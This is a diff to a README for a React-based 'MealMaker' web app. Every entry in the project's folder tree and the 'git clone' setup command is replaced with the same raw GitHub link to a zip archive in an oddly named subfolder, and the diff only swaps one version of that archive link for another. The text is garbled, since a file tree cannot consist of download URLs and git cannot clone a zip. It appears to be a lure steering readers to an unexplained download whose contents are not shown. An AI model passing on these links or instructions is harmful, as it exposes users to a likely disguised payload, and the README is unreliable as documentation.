@@ -21,11 +21,11 @@ A fun, interactive web app built with **React** and **Tailwind CSS** that letuse
 ```
 MealMaker/
 ├── components/
-│   ├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
-│   └── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
-├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
-├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
-└── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
+│   ├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker-Meal-2.7.zip
+│   └── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker-Meal-2.7.zip
+├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker-Meal-2.7.zip
+├── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker-Meal-2.7.zip
+└── https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker-Meal-2.7.zip
 ```
 
 ---
@@ -35,7 +35,7 @@ MealMaker/
 1. **Clone the repository**
 
 ```bash
-git clone https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker_Meal_v1.1.zip
+git clone https://raw.githubusercontent.com/Eliakim-ellie/Meal-Maker/main/Acrostichum/Maker-Meal-2.7.zip
 cd meal-maker
 ```
 
